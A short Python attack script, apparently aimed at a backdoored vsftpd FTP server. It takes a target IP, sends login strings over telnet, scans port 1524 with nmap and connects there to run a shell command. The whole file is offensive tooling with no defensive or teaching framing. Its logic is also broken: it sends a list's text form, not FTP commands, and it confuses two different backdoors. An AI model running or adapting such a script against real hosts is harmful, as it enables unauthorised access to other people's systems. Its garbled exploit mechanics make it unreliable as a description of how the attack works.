import subprocess
import time

def exploit_vsftpd():
    ip = input("What is the targeted IP ? :")
    try:
        print(f"[*] Attempting to exploit VSFTPD backdoor on {ip}...")
        
        # Step 1: Connect to FTP and send malicious commands
        commands = ["USER", "user\n","PASS", "pass\n"]
        with subprocess.Popen(["telnet", ip, "21"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as telnet:
            telnet.stdin.write(str(commands))
            telnet.stdin.flush()
            time.sleep(3)  # Wait a few seconds for the exploit to trigger
            telnet.terminate()

        # Step 2: Scan for the backdoor port 1524 using Nmap
        print("[*] Scanning for port 1524...")
        nmap_scan = subprocess.run(["nmap", "-p", "1524", ip], capture_output=True, text=True)
        if "1524/tcp open" in nmap_scan.stdout:
            print("[+] Backdoor opened on port 1524!")

            # Step 3: Connect to the backdoor port and execute commands
            print("[*] Connecting to port 1524...")
            with subprocess.Popen(["telnet", ip, "1524"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as backdoor:
                backdoor.stdin.write("id;\n")
                backdoor.stdin.flush()
                time.sleep(2)
                output, error = backdoor.communicate()
                print("[+] Output from backdoor:")
                print(output.strip())
        else:
            print("[-] Port 1524 not open. Exploit may have failed.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
